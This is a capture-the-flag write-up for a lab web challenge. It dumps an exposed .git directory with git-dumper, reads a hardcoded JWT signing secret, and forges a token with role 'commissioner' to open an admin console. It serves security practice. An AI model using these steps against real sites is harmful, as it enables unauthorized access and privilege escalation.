---

Name: WorldOutter
Difficulty: Medium
URL: https://dashboard.webverselabs-pro.com/events/worldoutter
Description: The league app was built by one of the managers over a couple of weekends and deployed straight from their laptop. It runs fine on Sundays. The way it decides who is allowed into the commissioner console has never really been stress-tested. 

---

Gobuster found the .git/HEAD file so I tried to dump the github repo

```bash
$ git-dumper https://b9f85b7b-5330-worldoutter-dcf70.events.webverselabs-pro.com/.git ./dump
```

We can inspect the files now

```bash
$ tree
.
├── config
│   └── secret.js
├── package.json
├── public
│   └── site.css
└── server.js

```

Our goal is to become a commissioner
```javascript
app.get('/commissioner', (req, res) => {
  if (!req.claims || req.claims.role !== 'commissioner') {
    res.status(403).send(layout('Commissioner', '', `<section class="wo-panel wo-denied">
      <div class="wo-panel__h">Commissioner console</div>
      <p class="wo-denied__msg">403 - Commissioner access only. Your league role is <code>${h(req.claims ? req.claims.role : 'guest')}</code>. Only the league commissioner can open this console.</p>
    </section>`));
    return;
  }
  const body = `<section class="wo-panel">
    <div class="wo-panel__h">Commissioner console</div>
    <p class="wo-comm__lead">Welcome, Commissioner. These controls affect every team in ${h(LEAGUE)}.</p>
    <div class="wo-comm__grid">
      <div class="wo-comm__card"><h4>Edit scoring settings</h4><p>PPR, bonuses, and stat corrections.</p></div>
      <div class="wo-comm__card"><h4>Process trades</h4><p>Approve or veto pending trades.</p></div>
      <div class="wo-comm__card"><h4>Manage members</h4><p>Invite, remove, and reassign teams.</p></div>
    </div>
    <div class="wo-comm__key"><span>League API key (keep private)</span><code>${h(FLAG)}</code></div>
  </section>`;
  res.send(layout('Commissioner', '', body));
});

```

We find the JWT_SECRET value inside config/secret.js

```bash
$ cat secret.js
// Session signing secret for WorldOutter league auth.
// TODO(dev): pull this from a real secret manager before we scale.
module.exports = { JWT_SECRET: '3b92351c7402e9cdc69b2251aaa96bc2' };
```

We can create our own JWT token with any role we want

At the moment our token is
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91IiwidGVhbSI6IkdyaWRpcm9uIEdvcGhlcnMiLCJyb2xlIjoibWVtYmVyIiwiaWF0IjoxNzg3NDc5ODQ5fQ.zatAa2Q0F2osdEwGWKEywuqSqLU4HjXM924zh1JGsxw
```

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

```json
{
  "user": "you",
  "team": "Gridiron Gophers",
  "role": "member",
  "iat": 1787479849
}
```

Let's change our role to commissioner and craft a new one

![jwt.io](../../../public/images/webverse_pro/challs/worldoutter-jwt.png) 

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91IiwidGVhbSI6IkdyaWRpcm9uIEdvcGhlcnMiLCJyb2xlIjoiY29tbWlzc2lvbmVyIiwiaWF0IjoxNzg3NDc5ODQ5fQ.-5ZjC85-PaTevMnpWsB9yJPBk8knNGZyEdMCzqiDAhg
```

With this token we can now access /commissioner and get the flag

